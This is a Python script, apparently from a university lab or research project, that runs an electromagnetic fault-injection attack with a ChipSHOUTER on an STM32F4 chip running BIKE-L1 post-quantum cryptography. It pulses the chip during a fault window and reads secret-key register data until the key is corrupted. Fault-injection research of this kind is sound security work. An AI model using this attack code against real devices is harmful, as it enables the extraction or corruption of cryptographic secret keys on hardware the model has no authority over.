import time

import numpy as np
from RPi import GPIO
from bitstring import BitArray
from chipshouter import ChipSHOUTER

from Comm import Response, ResetRelay, Comm, STATUS
from emfi_station import Attack
from emfi_station.utils import add_tuples

# import pyserial

# chip dimensions: 12x12 mm
stm32f4_delta = (12, 12, 0)
stm32f4_start = (99, 60, 80)
stm32f4_start_offset = (8, 0, 0)
stm32f4_end_offset = (0, -2, 0)

stm32f4_end = add_tuples(stm32f4_start, stm32f4_delta)

stm32f4_start = add_tuples(stm32f4_start, stm32f4_start_offset)
stm32f4_end = add_tuples(stm32f4_end, stm32f4_end_offset)

repetitions = 2 ** 64  # 5223 (SK LENGTH) / 8 (2 registers per transaction)

HAMMING_WEIGHT_MAX_THRESH = 95
BIKE_SK_LEN_BIT = 5223 * 8


class BikeL1(Attack):
    cs: ChipSHOUTER
    response_before_fault: Response
    response_after_fault: Response

    def __init__(self):
        super().__init__(start_pos=stm32f4_start,
                         end_pos=stm32f4_end,
                         step_size=1,
                         max_target_temp=60,
                         cooling=0.5,
                         repetitions=repetitions)
        self.aw = None

        # Parameters based on behavior of Device firmware, using BCM pins
        self.reg_size = 4  # in bytes
        self.regs = ["r10", "r11"]
        self.miso_pin = 9
        self.mosi_pin = 10
        self.clk_pin = 11
        self.reset_pin = 0
        self.dut_prep_time = .01  # in seconds

        self.hamming_weight = 0
        self.sk = BitArray()

        # The end sequence acts like a "checksum", if it is not transferred correctly, we cant be sure about the results
        self.end_seq = BitArray(bytes=b"\x42\x42\x42\x42")
        self.fault_window_start_seq = BitArray(bytes=b"\x2a\x2a\x2a\x2a")
        self.fault_window_end_seq = BitArray(bytes=b"\x13\x37\x13\x37")

        GPIO.setmode(GPIO.BCM)  # This is needed as adafruit uses BCM Mode
        GPIO.setup(self.miso_pin, GPIO.IN)
        GPIO.setup(self.mosi_pin, GPIO.OUT)

        self.reset = ResetRelay(self.reset_pin)
        self.device = Comm(reset=self.reset,
                           miso_pin=self.miso_pin,
                           clk_pin=self.clk_pin,
                           regs=self.regs,
                           reg_size=self.reg_size,
                           fault_window_start_seq=self.fault_window_start_seq,
                           fault_window_end_seq=self.fault_window_end_seq,
                           reg_data_expected=None)
    @staticmethod
    def name() -> str:
        return f"BIKEL1 ({stm32f4_start} => {stm32f4_end}, {repetitions})"

    def init(self, aw) -> None:
        self.aw = aw
        self.cs = ChipSHOUTER("/dev/ttyUSB0")
        self.cs.voltage = 500
        self.cs.pulse.repeat = 5
        GPIO.output(self.mosi_pin, 1)  # set control pin high (otherwise no fault window is started)

    def shout(self) -> None:
        time_taken = self.device.wait_fault_window_start()
        if time_taken < 0:
            self.response_before_fault.status.add(STATUS.RESET_UNSUCCESSFUL)
        while True:
            try:
                if not self.cs.armed:
                    self.cs.armed = True
                    time.sleep(.5)
                self.cs.pulse = True
            except Exception as e:
                self.log.error(e)
                time.sleep(5)
                self.cs.disconnect()
                time.sleep(5)
                self.cs.connect()
                continue
            return

    def was_successful(self) -> bool:
        time_taken = self.device.wait_fault_window_end()
        self.log.info(f"Waiting for fault window end took {time_taken} seconds")
        if time_taken < 0:  # a timeout, we cannot say anything about the device's state!
            self.log.info('Did not find start sequence, resetting')
            self.hamming_weight = 0
            self.sk = BitArray()
            self.reset.reset()
            return False
        else:  # we know the device sent the fault window end sequence
            # wait for DUT to arrive at transfer()
            time.sleep(self.dut_prep_time)
            # read the register values
            self.response_after_fault = self.device.read_regs()
            # wait for DUT to arrive at transfer()
            time.sleep(self.dut_prep_time)
            # read end sequence
            _data = self.device.read(self.end_seq.len // 8)
            # make sure the end sequence was received
            if _data != self.end_seq:
                self.log.info('Did not find end sequence, resetting')
                self.hamming_weight = 0
                self.sk = BitArray()
                self.reset.reset()
                return False
            self.hamming_weight += sum([reg.hamming_weight() for reg in self.response_after_fault.reg_data.values()])
            for reg in [reg.data for reg in self.response_after_fault.reg_data]:
                self.sk.append(reg)  # TODO check order

            self.log.info('Hamming weight so far: %d', self.hamming_weight)

            if self.hamming_weight > HAMMING_WEIGHT_MAX_THRESH:
                GPIO.output(self.mosi_pin, 0)  # set control pin low, now we stop faulting
                self.log.info('We now have a faulty key! GZ Abgabe ez 1.0')
                self.shutdown()
                exit(0)
            if len(self.sk) >= BIKE_SK_LEN_BIT:
                self.log.info('Finished, final hamming weight: %d', self.hamming_weight)
                self.shutdown()
                return True
        return False

    def reset_target(self) -> None:
        return  # else, the device is reset after each rep

    def critical_check(self) -> bool:
        return True

    def shutdown(self) -> None:
        # from datetime import datetime
        # timestamp = datetime.now().strftime("%Y-%m-%d-%H:%M:%S")
        # _dir = Path("pickles")
        # if not _dir.exists():
        #    os.makedirs(_dir)
        # filename = f"data_{timestamp}.pickle"
        # filepath = _dir.joinpath(filename)
        # fp = open(filepath, "wb")
        # evaluate the data:
        # self.log.debug(f'writing progress to pickle due to shutdown')
        # pickle.dump(self.dps, fp)
        # storage_fp.close()
        self.cs.armed = 0
        self.reset.reset()
        print("End...")


if __name__ == '__main__':
    BikeL1()
